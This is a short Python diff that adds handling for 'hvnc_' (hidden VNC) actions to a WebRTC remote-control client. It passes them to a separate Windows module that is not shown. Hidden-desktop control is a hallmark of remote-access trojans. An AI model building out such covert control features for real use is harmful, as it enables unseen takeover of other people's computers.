@@ -870,6 +870,31 @@ class WebRTCClient:
                 )
             return
 
+        # HVNC Actions
+        if action.startswith("hvnc_"):
+            hvnc_action = action[5:]  # Remove "hvnc_" prefix
+            try:
+                from remote_client.windows.hvnc_actions import handle_hvnc_action
+                response = handle_hvnc_action(hvnc_action, payload)
+                self._send_payload(data_channel, response)
+            except ImportError:
+                self._send_error(
+                    data_channel,
+                    "hvnc_unavailable",
+                    "HVNC module not available on this platform.",
+                )
+            except Exception as exc:
+                logger.warning("HVNC action %s failed: %s", action, exc)
+                self._send_payload(
+                    data_channel,
+                    {
+                        "action": action,
+                        "success": False,
+                        "error": str(exc),
+                    },
+                )
+            return
+
         self._send_error(
             data_channel, "unknown_action", f"Unknown action '{action}'."
         )
